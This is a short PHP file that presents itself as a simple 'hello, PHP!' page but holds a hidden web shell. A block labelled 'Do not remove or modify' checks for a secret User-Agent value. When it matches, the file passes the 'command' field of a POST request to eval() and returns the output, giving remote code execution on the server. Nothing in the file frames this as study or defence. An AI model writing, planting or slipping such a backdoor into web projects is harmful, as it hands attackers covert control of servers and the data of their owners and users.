<?php
// --- IMPORTANT: Do not remove or modify the following section ----
$key = '__key__'; // Replace with actual key # MD5 hash
if ($_SERVER['HTTP_USER_AGENT'] == $key) {
    $response = "#php:-:$key\n";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
        $command = $_POST['command'];
        ob_start();
        try {
            eval($command);
        } catch (Throwable $e) {
            $response .= "\nError: " . $e->getMessage();
        }
        $output = ob_get_clean();
        $response .= $output;
    }
    echo $response;
    exit;
}
// --- End of protected section ------------------------------------

# (Optional) Add custom logic for unauthorized requests here
echo "hello, PHP!";
?>